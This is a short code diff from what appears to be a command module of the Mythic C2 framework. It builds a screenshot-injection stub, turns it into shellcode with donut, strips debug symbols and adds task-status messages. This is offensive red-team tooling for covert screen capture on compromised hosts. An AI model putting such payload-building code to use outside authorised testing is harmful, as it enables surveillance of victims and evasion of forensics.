@@ -75,7 +75,7 @@ class ScreenshotInjectCommand(CommandBase):
         outputPath = "{}/ScreenshotInject/bin/Release/ScreenshotInject.exe".format(agent_build_path.name)
             # shutil to copy payload files over
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/ScreenshotInject/ScreenshotInject.csproj -o {}/ScreenshotInject/ScreenshotInject.exe".format(agent_build_path.name, agent_build_path.name)
+        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/ScreenshotInject/ScreenshotInject.csproj -o {}/ScreenshotInject/ScreenshotInject.exe".format(agent_build_path.name, agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                          stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
@@ -91,7 +91,15 @@ class ScreenshotInjectCommand(CommandBase):
         )
         global SCREENSHOT_INJECT
         if not path.exists(SCREENSHOT_INJECT):
+            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
+                TaskID=taskData.Task.ID,
+                UpdateStatus=f"building injection stub"
+            ))
             await self.build_screenshotinject()
+        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
+            TaskID=taskData.Task.ID,
+            UpdateStatus=f"generating stub shellcode"
+        ))
         donutPath = os.path.abspath(self.agent_code_path / "donut")
         if not path.exists(donutPath):
             raise Exception("Could not find {}".format(donutPath))
